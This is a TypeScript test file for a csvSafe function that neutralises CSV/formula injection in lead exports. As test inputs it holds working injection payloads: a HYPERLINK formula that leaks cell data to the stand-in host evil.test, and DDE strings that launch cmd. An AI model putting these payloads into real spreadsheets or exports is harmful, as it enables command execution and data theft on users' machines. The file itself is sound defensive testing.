/**
 * The shared CSV-injection escape.
 *
 * This is the last thing standing between a visitor-typed string and code
 * execution on the customer's laptop when they open the download, so it is
 * tested against the whole OWASP trigger list rather than the `=` everyone
 * remembers. The tests proving each export actually *calls* it live next to
 * that export (`leadsCsv.test.ts`).
 */
import { describe, expect, it } from 'vitest';

import { csvSafe } from './csvSafe';

const TRIGGERS = ['=', '+', '-', '@', '\t', '\r'] as const;

describe('csvSafe', () => {
  it.each([
    ['=HYPERLINK("https://evil.test/?"&A1,"Click")', 'formula'],
    ['+cmd|" /C calc"!A0', 'signed expression / DDE'],
    ['-2+3+cmd|" /C calc"!A0', 'signed expression / DDE'],
    ["@SUM(1+1)*cmd|' /C calc'!A0", 'legacy Lotus-style formula'],
    // Excel strips a leading TAB/CR before deciding whether the cell is a
    // formula, so a check that only looks for '=' misses these two.
    ['\t=1+1', 'TAB-prefixed formula'],
    ['\r=1+1', 'CR-prefixed formula'],
  ])('neutralises %j (%s)', (payload, why) => {
    const escaped = csvSafe(payload);

    // The defence: a leading single quote, so the spreadsheet reads the rest
    // of the cell as literal text rather than as an expression.
    expect(escaped, why).toBe(`'${payload}`);
    expect(TRIGGERS.some((t) => escaped.startsWith(t))).toBe(false);
    // Nothing is silently dropped — the value stays fully recoverable.
    expect(escaped.slice(1)).toBe(payload);
  });

  it('acts on every character in the trigger list', () => {
    /* Guards against the list being widened for documentation value while the
       escape silently keeps using a narrower rule. */
    for (const trigger of TRIGGERS) {
      expect(csvSafe(`${trigger}payload`)).toBe(`'${trigger}payload`);
    }
  });

  it.each(['Priya Sharma', 'Acme, Inc. "Main"', '', 'Café ☕', '2026 lead', 'priya@infosys.com'])(
    'leaves %j alone',
    (value) => {
      /* The escape is targeted — commas and quotes are the CSV writer's job.
         `priya@infosys.com` is the case worth naming: the trigger is a
         *leading* '@', so an ordinary email must survive untouched or every
         lead export grows a stray quote. */
      expect(csvSafe(value)).toBe(value);
    },
  );

  it('only looks at the leading position', () => {
    // A trigger further into the string is inert — Excel decides at cell start.
    expect(csvSafe('Budget is =1+1 per seat')).toBe('Budget is =1+1 per seat');
  });

  it('does not stack quotes when applied twice', () => {
    const once = csvSafe('=1+1');
    expect(csvSafe(once)).toBe(once);
  });

  it('escapes an E.164 phone number, which is intended', () => {
    /* Pinned so nobody "fixes" it later. '+91 98000 00000' starts with '+', so
       it picks up a quote like any other triggering cell. Exempting values that
       "look like" a phone number is not an option — '+1+1' looks exactly as
       numeric as '+91' — and every published bypass of this defence lives in
       precisely that kind of heuristic. Matches `csv_safe` on the backend. */
    expect(csvSafe('+91 98000 00000')).toBe("'+91 98000 00000");
  });
});
